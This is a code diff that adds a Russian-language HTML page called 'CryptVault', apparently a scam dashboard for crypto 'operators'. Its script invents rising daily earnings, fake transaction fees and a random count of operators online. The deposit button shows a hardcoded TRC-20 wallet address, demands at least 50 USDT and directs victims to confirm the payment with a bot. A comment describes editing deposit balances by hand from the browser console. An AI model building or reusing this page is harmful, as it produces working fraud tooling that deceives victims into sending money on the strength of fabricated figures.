@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>CryptVault</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #0b0e14;
+      font-family: -apple-system, system-ui, sans-serif;
+      color: #e6edf3;
+      padding: 16px 16px 40px;
+      min-height: 100vh;
+    }
+    .status-bar { display: flex; justify-content: space-between; font-size: 13px; color: #6a7a8a; padding-bottom: 8px; border-bottom: 1px solid #1e2632; }
+    .logo { font-size: 22px; font-weight: 700; color: #f0b90b; }
+    .balance-card { background: #161e2a; border-radius: 24px; padding: 24px; margin: 20px 0; text-align: center; border: 1px solid #2a3340; }
+    .balance-label { font-size: 14px; color: #8a9aaa; }
+    .balance-number { font-size: 42px; font-weight: 800; color: #7dd3fc; letter-spacing: 1px; }
+    .change-positive { color: #4ade80; font-size: 14px; }
+    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 16px 0; }
+    .card { background: #161e2a; border-radius: 18px; padding: 16px; border: 1px solid #1e2632; }
+    .card .label { font-size: 12px; color: #8a9aaa; text-transform: uppercase; }
+    .card .value { font-size: 20px; font-weight: 700; margin-top: 6px; }
+    .deposit-btn {
+      background: #f0b90b; color: #0b0e14; border: none; border-radius: 60px;
+      padding: 18px; width: 100%; font-size: 18px; font-weight: 700;
+      margin: 24px 0 16px; cursor: pointer;
+    }
+    .tx-feed { background: #0f1721; border-radius: 16px; padding: 14px; font-size: 14px; color: #b0c0d0; }
+    .tx-feed span { color: #4ade80; font-weight: 600; }
+    .footer { font-size: 11px; color: #3a4a5a; text-align: center; margin-top: 20px; }
+    .network-badge { background: #1a2a3a; display: inline-block; padding: 4px 12px; border-radius: 30px; font-size: 11px; color: #7dd3fc; margin-bottom: 6px; }
+  </style>
+</head>
+<body>
+  <div class="status-bar">
+    <span class="logo">◈ CRYPTVAULT</span>
+    <span>Оператор #{{ID}}</span>
+  </div>
+
+  <div class="balance-card">
+    <div class="balance-label">СЕГОДНЯ ЗАРАБОТАНО</div>
+    <div class="balance-number" id="todayEarn">0.00</div>
+    <div class="change-positive" id="changePerc">▲ +0.0% за час</div>
+  </div>
+
+  <div class="grid-2">
+    <div class="card"><div class="label">Рабочий депозит</div><div class="value" id="workDep">0 USDT</div></div>
+    <div class="card"><div class="label">Страховой депозит</div><div class="value" id="insDep">0 USDT</div></div>
+  </div>
+
+  <div class="tx-feed" id="lastTx">⏳ Последняя заявка: ожидание...</div>
+
+  <button class="deposit-btn" id="depositBtn">📥 Пополнить депозит</button>
+
+  <div class="footer">
+    <span id="onlineCounter">● 3 оператора онлайн</span><br>
+    <span style="color:#2a3a4a;">Выплаты каждые 24 ч | Поддержка 24/7</span>
+  </div>
+
+  <script>
+    // ===== НАСТРОЙКИ (TRC-20) =====
+    const MY_WALLET = "TKyPu8HQNVoXsTes4QtePVavAUPMY5cNLs";  // Например: TQm8JpW5F7...
+    const NETWORK = "TRC-20 (Tron)";
+    // ================================
+
+    let earned = 0;
+    let workDep = 0;
+    let insDep = 0;
+
+    // Имитация роста дохода и заявок
+    setInterval(() => {
+      const add = (Math.random() * 3 + 0.8);
+      earned += add;
+      document.getElementById('todayEarn').textContent = earned.toFixed(2) + ' USDT';
+      document.getElementById('changePerc').textContent = '▲ +' + (Math.random() * 5 + 2).toFixed(1) + '% за час';
+
+      const txs = [
+        '✅ Перевод 2.3 ETH (комиссия 47 USDT)',
+        '✅ Обработка 1.8 BTC (комиссия 92 USDT)',
+        '✅ Пул 5.1 SOL (комиссия 18 USDT)',
+        '✅ Конвертация 12.7 BNB (комиссия 33 USDT)'
+      ];
+      document.getElementById('lastTx').textContent = '📌 ' + txs[Math.floor(Math.random() * txs.length)];
+
+      const online = Math.floor(Math.random() * 6) + 2;
+      document.getElementById('onlineCounter').textContent = '● ' + online + ' операторов онлайн';
+    }, 7000);
+
+    // Кнопка депозита — с сетью TRC-20
+    document.
+getElementById('depositBtn').addEventListener('click', function() {
+      alert(
+        'Пополнение рабочего депозита\n\n' +
+        'Сеть: ' + NETWORK + '\n' +
+        'Адрес:\n' + MY_WALLET + '\n\n' +
+        '⚠️ Отправляйте ТОЛЬКО USDT (TRC-20)\n' +
+        'Минимальная сумма: 50 USDT\n' +
+        'После перевода напишите боту: /deposit_confirm'
+      );
+    });
+
+    // Для ручной правки депозитов (через консоль браузера)
+    // document.getElementById('workDep').textContent = '50 USDT';
+    // document.getElementById('insDep').textContent = '30 USDT';
+  </script>
+</body>
+</html>
